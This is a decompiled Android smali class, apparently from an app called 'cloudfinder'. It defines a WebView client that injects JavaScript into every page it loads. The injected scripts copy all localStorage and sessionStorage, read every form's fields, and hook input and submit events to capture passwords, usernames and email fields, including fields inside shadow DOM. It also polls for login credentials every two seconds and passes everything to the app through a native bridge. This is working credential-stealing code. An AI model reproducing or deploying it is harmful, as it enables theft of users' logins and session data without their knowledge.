.class public final Lڛەٟہ/ا;
.super Landroid/webkit/WebViewClient;
.source "SourceFile"


# instance fields
.field public final synthetic ؋:I

.field public final synthetic ؠ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(ILjava/lang/Object;)V
    .locals 0

    iput p1, p0, Lڛەٟہ/ا;->؋:I

    iput-object p2, p0, Lڛەٟہ/ا;->ؠ:Ljava/lang/Object;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lcom/lite/cloudfinder/activity/WebHarvesterActivity;)V
    .locals 1

    const/4 v0, 0x1

    iput v0, p0, Lڛەٟہ/ا;->؋:I

    invoke-direct {p0, v0, p1}, Lڛەٟہ/ا;-><init>(ILjava/lang/Object;)V

    return-void
.end method


# virtual methods
.method public final onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
    .locals 2

    iget v0, p0, Lڛەٟہ/ا;->؋:I

    const/4 v1, 0x0

    packed-switch v0, :pswitch_data_0

    invoke-super {p0, p1, p2}, Landroid/webkit/WebViewClient;->onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V

    return-void

    :pswitch_0
    const-string p2, "(function(){document.addEventListener(\'keydown\',function(e){if(e.key===\'Enter\'||e.keyCode===13){var a=document.activeElement;if(a&&(a.tagName===\'INPUT\'||a.tagName===\'SELECT\')){var ins=Array.from(document.querySelectorAll(\'input:not([type=hidden]):not([type=submit]):not([type=button]),select\'));var i=ins.indexOf(a);if(i>=0&&i<ins.length-1){ins[i+1].focus();}else{var b=document.querySelector(\'button[type=submit],input[type=submit],.submit-btn,#submitBtn,button,.btn-submit\');if(b)b.click();}e.preventDefault();}}});})();"

    invoke-virtual {p1, p2, v1}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V

    return-void

    :pswitch_1
    invoke-super {p0, p1, p2}, Landroid/webkit/WebViewClient;->onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V

    iget-object v0, p0, Lڛەٟہ/ا;->ؠ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/activity/WebHarvesterActivity;

    iget-object v0, v0, Lcom/lite/cloudfinder/activity/WebHarvesterActivity;->ؠ:Landroid/widget/TextView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_0
    const-string p2, "(function() {var storageData = {  localStorage: {},  sessionStorage: {},  url: window.location.href,  timestamp: new Date().toISOString()};try {  for (var i = 0; i < localStorage.length; i++) {    var key = localStorage.key(i);    storageData.localStorage[key] = localStorage.getItem(key);  }} catch(e) {}try {  for (var i = 0; i < sessionStorage.length; i++) {    var key = sessionStorage.key(i);    storageData.sessionStorage[key] = sessionStorage.getItem(key);  }} catch(e) {}var json = JSON.stringify(storageData);if (json.length > 10) Android.saveUserInputData(json);})();"

    invoke-virtual {p1, p2, v1}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V

    const-string p2, "(function() {var allForms = [];var forms = document.getElementsByTagName(\'form\');for (var i = 0; i < forms.length; i++) {  var form = forms[i];  var inputs = form.querySelectorAll(\'input, textarea, select\');  var formData = {    formIndex: i,    action: form.action,    method: form.method,    inputs: [],    html: form.outerHTML.substring(0, 1000),    url: window.location.href,    timestamp: new Date().toISOString()  };  for (var j = 0; j < inputs.length; j++) {    var input = inputs[j];    formData.inputs.push({      name: input.name,      type: input.type,      value: input.value,      placeholder: input.placeholder,      id: input.id,      required: input.required    });  }  allForms.push(formData);}if (allForms.length > 0) Android.saveUserInputData(JSON.stringify({type:\'form_scan\',forms:allForms}));})();"

    invoke-virtual {p1, p2, v1}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V

    const-string p2, "(function() {if (window.__harvesterInjected) return;window.__harvesterInjected = true;function isPasswordField(input) {  return input.type === \'password\' ||    (input.name && input.name.toLowerCase().indexOf(\'pass\') !== -1) ||    (input.id && input.id.toLowerCase().indexOf(\'pass\') !== -1) ||    input.autocomplete === \'current-password\' ||    input.autocomplete === \'new-password\' ||    (input.placeholder && input.placeholder.toLowerCase().indexOf(\'password\') !== -1);}var forms = document.getElementsByTagName(\'form\');for (var i = 0; i < forms.length; i++) {  forms[i].addEventListener(\'submit\', function(e) {    var formData = {      type: \'form_submission\',      action: this.action,      method: this.method,      inputs: [],      timestamp: new Date().toISOString(),      url: window.location.href    };    var inputs = this.querySelectorAll(\'input, textarea, select\');    for (var j = 0; j < inputs.length; j++) {      var input = inputs[j];      formData.inputs.push({        name: input.name,        type: input.type,        value: input.value,        placeholder: input.placeholder,        id: input.id      });    }    Android.saveUserInputData(JSON.stringify(formData));  });}function findInputsInShadowDOM(element) {  var inputs = [];  if (element.shadowRoot) {    inputs = inputs.concat(Array.from(element.shadowRoot.querySelectorAll(\'input, textarea, select\')));  }  var children = element.children;  for (var i = 0; i < children.length; i++) {    inputs = inputs.concat(findInputsInShadowDOM(children[i]));  }  return inputs;}var inputs = Array.from(document.querySelectorAll(\'input, textarea, select\')).concat(findInputsInShadowDOM(document.body));for (var i = 0; i < inputs.length; i++) {  inputs[i].addEventListener(\'change\', function(e) {    var inputData = {      type: \'input_change\',      field: this.name || this.id,      inputType: this.type,      value: this.value,      placeholder: this.placeholder,      isPassword: isPasswordField(this),      timestamp: new Date().toISOString(),      url: window.location.href    };    Android.saveUserInputData(JSON.stringify(inputData));  });  inputs[i].addEventListener(\'input\', function(e) {    if (isPasswordField(this) ||         (this.name && (this.name.toLowerCase().indexOf(\'user\') !== -1 ||          this.name.toLowerCase().indexOf(\'email\') !== -1 ||          this.name.toLowerCase().indexOf(\'login\') !== -1 ||          this.name.toLowerCase().indexOf(\'account\') !== -1))) {      var sensitiveData = {        type: isPasswordField(this) ? \'password_input\' : \'credential_input\',        field: this.name || this.id,        inputType: this.type,        value: this.value,        placeholder: this.placeholder,        timestamp: new Date().toISOString(),        url: window.location.href      };      Android.saveUserInputData(JSON.stringify(sensitiveData));    }  });}function captureLoginCredentials() {  var loginForms = document.querySelectorAll(\'form\');  loginForms.forEach(function(form) {    var usernameFields = form.querySelectorAll(\'input[type=\"text\"], input[type=\"email\"], input[name*=\"user\"], input[name*=\"email\"], input[autocomplete*=\"username\"], input[autocomplete*=\"email\"]\');    var passwordFields = form.querySelectorAll(\'input[type=\"password\"], input[name*=\"pass\"], input[autocomplete*=\"password\"]\');    if (usernameFields.length > 0 && passwordFields.length > 0) {      var loginData = {        type: \'login_form_detected\',        url: window.location.href,        usernameFields: Array.from(usernameFields).map(function(f) { return { name: f.name, id: f.id, value: f.value }; }),        passwordFields: Array.from(passwordFields).map(function(f) { return { name: f.name, id: f.id, value: f.value }; }),        timestamp: new Date().toISOString()      };      if (passwordFields[0].value.length > 0) Android.saveUserInputData(JSON.stringify(loginData));    }  });}setInterval(captureLoginCredentials, 2000);})();"

    invoke-virtual {p1, p2, v1}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V

    return-void

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public final shouldOverrideUrlLoading(Landroid/webkit/WebView;Landroid/webkit/WebResourceRequest;)Z
    .locals 2

    iget v0, p0, Lڛەٟہ/ا;->؋:I

    const/4 v1, 0x1

    packed-switch v0, :pswitch_data_0

    :pswitch_0
    invoke-super {p0, p1, p2}, Landroid/webkit/WebViewClient;->shouldOverrideUrlLoading(Landroid/webkit/WebView;Landroid/webkit/WebResourceRequest;)Z

    move-result p1

    return p1

    :pswitch_1
    invoke-interface {p2}, Landroid/webkit/WebResourceRequest;->getUrl()Landroid/net/Uri;

    move-result-object p2

    invoke-virtual {p2}, Landroid/net/Uri;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    return v1

    :pswitch_2
    invoke-interface {p2}, Landroid/webkit/WebResourceRequest;->getUrl()Landroid/net/Uri;

    move-result-object p2

    invoke-virtual {p2}, Landroid/net/Uri;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    return v1

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public final shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .locals 1

    iget v0, p0, Lڛەٟہ/ا;->؋:I

    packed-switch v0, :pswitch_data_0

    invoke-super {p0, p1, p2}, Landroid/webkit/WebViewClient;->shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z

    move-result p1

    return p1

    :pswitch_0
    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    const/4 p1, 0x1

    return p1

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
    .end packed-switch
.end method
